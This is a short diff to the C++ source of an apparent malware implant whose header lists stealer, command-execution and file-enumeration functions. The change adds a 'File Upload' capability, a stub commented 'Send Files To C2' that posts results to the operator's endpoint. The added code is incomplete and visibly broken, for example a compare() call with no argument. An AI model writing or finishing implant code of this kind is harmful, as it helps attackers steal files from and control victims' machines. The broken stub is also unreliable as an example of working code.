@@ -6,6 +6,7 @@
 - Stealer
 - Execution <arg> - List command to run
 - File_Enumeration <arg> - List files in the directory
+- File Upload
  */
 void execute(std::string command, std::string args, int task_id, int implant_id){
 
@@ -128,6 +129,20 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
     }
    
+    /* Send Files To C2*/
+    if(command.compare() == 0){
+        try{
+            /* Add in Command for Post.cpp 
+            Then add in results = to that result*/
+        }
+        catch(...){
+            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
+            work = "No";
+        }
+        if(work.compare("No") == 1){
+            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        }
+    }
     return;
 }
 
